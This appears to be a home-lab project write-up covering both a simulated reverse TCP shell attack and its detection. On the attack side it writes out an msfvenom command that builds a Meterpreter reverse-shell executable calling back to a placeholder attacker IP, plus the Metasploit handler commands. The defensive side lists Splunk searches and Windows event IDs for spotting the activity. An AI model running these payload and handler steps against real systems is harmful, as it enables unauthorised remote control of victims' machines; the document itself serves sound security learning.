
# Reverse TCP Shell & Malware Behaviour Analysis  
*A cybersecurity home lab project using Kali Linux, Windows, and Splunk*

---

## Overview  
This project demonstrates a complete **reverse TCP shell attack simulation** and **malware behaviour analysis** inside a controlled cybersecurity home lab.  
It includes both the **attacker’s perspective** (payload creation, delivery, shell) and the **defender’s perspective** (log analysis using Splunk).

This project helped me understand:

- How attackers generate reverse TCP payloads  
- How payloads are delivered to a victim system  
- How a reverse TCP shell works  
- What happens inside Windows when malware executes  
- How to investigate malicious activity using Splunk  

---

##  Tools Used

| Category | Tools |
|---------|-------|
| Operating Systems | Kali Linux (Attacker VM), Windows 10 (Victim VM) |
| Reconnaissance | Nmap |
| Payload Generation | Msfvenom |
| Payload Delivery | Python HTTP Server |
| Attack Interaction | msfconsole (multi/handler) |
| Windows Investigation | Task Manager, netstat, Event Viewer |
| Log Collection | Splunk Universal Forwarder |
| SIEM Analysis | Splunk Enterprise |

---

##  Objectives of This Project

- Understand reverse shell connection flow  
- Observe malware-like behaviour inside Windows  
- Identify suspicious processes and network activity  
- Collect Windows logs with Splunk  
- Detect execution events using Splunk searches  
- Build SOC-style detection logic for reverse TCP malware  

---

##  Step-by-Step Workflow

### **1. Reconnaissance**
Used Nmap to identify open ports and the reachable IP of the Windows VM.

### **2. Payload Creation (msfvenom)**  
Generated a reverse TCP executable:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=4444 -f exe -o payload.exe
```

### **3. Payload Delivery**
Used a Python HTTP server to host the file:

```
python3 -m http.server 8000
```

Victim downloaded the payload through the browser.

### **4. Reverse Shell Execution**
Started a Metasploit handler:

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <attacker-ip>
set LPORT 4444
run
```

Once the victim executed the payload, a reverse shell session opened.

### **5. Windows Behaviour Analysis**
Observed:

- New suspicious processes
- Outbound TCP connection to attacker machine
- Payload running silently in Task Manager
- Commands executed through the shell

Windows commands used:

```
netstat -ano
tasklist
ipconfig
net user
```

---

##  Splunk Malware Behaviour Analysis  
*(Defensive / SOC Perspective)*

Windows logs were collected using the **Splunk Universal Forwarder**, and the malware execution was analyzed in Splunk.

### Key telemetry investigated:

- **Process Creation Logs (Event ID 4688)**  
  To confirm execution of the malicious payload.

- **Network Connection Logs (Event ID 3)**  
  To detect outbound connection to Kali attacker IP on port 4444.

- **Suspicious parent/child process chain**  
  Example: unexpected `cmd.exe` spawning after payload execution.

- **Firewall logs (Event ID 5156)**  
  To confirm that outbound traffic for the reverse shell was allowed.

- **User context and session details**  
  To identify which account executed the payload.

### Splunk Searches Used

**Process creation detection:**
```
index=windows EventCode=4688 CommandLine=*
```

**Detect reverse TCP communication:**
```
index=windows EventCode=3 dest_port=4444
```

**Suspicious shell behaviour:**
```
index=windows process_name="cmd.exe" OR process_name="powershell.exe"
```

**Firewall outbound traffic:**
```
index=windows EventCode=5156
```

### What Splunk Confirmed

- The exact timestamp of payload execution  
- The executable that launched the reverse shell  
- The network connection to attacker IP  
- The commands executed on the victim  
- The process chain created by the malware  
- Evidence of malicious behaviour inside Windows  

---

##  Learning Outcomes

###  Offensive Skills  
- Reverse TCP shell workflow  
- Payload generation with msfvenom  
- Delivery through HTTP server  
- Using Metasploit handler  
- Understanding attacker activity inside Windows

###  Defensive Skills  
- Windows log analysis  
- Splunk searches and filtering  
- Identifying malicious process execution  
- Detecting suspicious outbound connections  
- Analysing attacker footprint using SIEM tools

---

## ✔️ Final Notes
This project demonstrates both **attacker techniques** and **defender analysis**.

